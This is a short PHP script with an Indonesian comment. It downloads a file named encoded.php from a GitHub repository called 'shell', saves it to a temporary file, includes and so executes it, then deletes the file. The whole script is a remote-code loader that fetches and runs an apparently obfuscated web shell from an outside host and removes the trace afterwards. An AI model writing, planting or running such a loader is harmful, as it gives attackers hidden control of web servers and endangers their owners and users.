<?php
$url = "https://raw.githubusercontent.com/Zeddgansz/shell/main/encoded.php";  // Ganti dengan URL yang diinginkan

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);

if ($result === false) {
    echo "Error: " . curl_error($ch);
} else {
    
    $tempFile = tempnam(sys_get_temp_dir(), 'pasted_code_');
    file_put_contents($tempFile, $result);
    
    include $tempFile;
    
    unlink($tempFile);
}

curl_close($ch);